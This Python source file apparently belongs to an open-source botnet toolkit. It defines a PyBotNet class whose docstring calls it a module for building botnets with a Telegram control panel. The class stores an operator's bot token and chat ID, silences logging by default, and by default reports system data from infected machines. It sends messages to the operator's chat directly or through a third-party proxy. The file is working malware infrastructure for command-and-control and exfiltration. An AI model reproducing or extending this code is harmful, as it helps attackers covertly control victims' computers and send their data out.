# import built-in & third-party modules
import logging

# import pybotnet modules
import util


class PyBotNet:
    '''
    A module for building botnets with Python and Telegram control panel\n
    '''

    def __init__(

        self,
        TELEGRAM_TOKEN,
        ADMIN_CHAT_ID,
        show_log=False,
        send_system_data=True
    ) -> None:

        self.TELEGRAM_TOKEN = TELEGRAM_TOKEN
        self.ADMIN_CHAT_ID = ADMIN_CHAT_ID
        self.show_log = show_log  # show logs
        self.send_system_data = send_system_data  # send system info in message

        # logging:
        if self.show_log:
            # show all log's
            self.log_level = logging.INFO
        else:
            # off all log's
            self.log_level = 100
        self.my_logger = logging
        self.my_logger.basicConfig(level=self.log_level)
        self.logger = self.my_logger.getLogger('PyBotNet')

    def send_message_by_third_party_proxy(self, message):
        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                      self.ADMIN_CHAT_ID, message)
        return util.post_data_by_third_party_proxy(self.api_url, self.logger)

    def send_message(self, message):
        self.api_url = util.make_send_message_api_url(self.TELEGRAM_TOKEN,
                                                      self.ADMIN_CHAT_ID, message)
        return util.post_data(self.api_url, self.logger)
